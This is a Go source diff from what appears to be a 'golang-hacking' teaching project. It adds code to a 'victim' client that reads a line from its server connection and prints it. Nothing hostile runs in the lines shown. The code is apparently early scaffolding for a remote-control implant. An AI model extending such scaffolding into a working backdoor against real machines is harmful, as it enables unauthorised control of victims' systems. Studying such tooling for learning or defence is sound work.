@@ -1,9 +1,11 @@
 package main
 
 import (
+	"bufio"
 	"fmt"
 	"golang-hacking/VictimFinalVersion/core/handleConnection"
 	"log"
+	"strings"
 )
 
 func main() {
@@ -17,4 +19,12 @@ func main() {
 	defer connection.Close()
 	fmt.Println("[+] Connection established with Server :", connection.RemoteAddr().String())
 
+	reader := bufio.NewReader(connection)
+
+	dataReceived, err := reader.ReadString('\n')
+	if err != nil {
+		log.Fatal(err)
+	}
+	data := strings.TrimSuffix(dataReceived, "\n")
+	fmt.Println(data)
 }
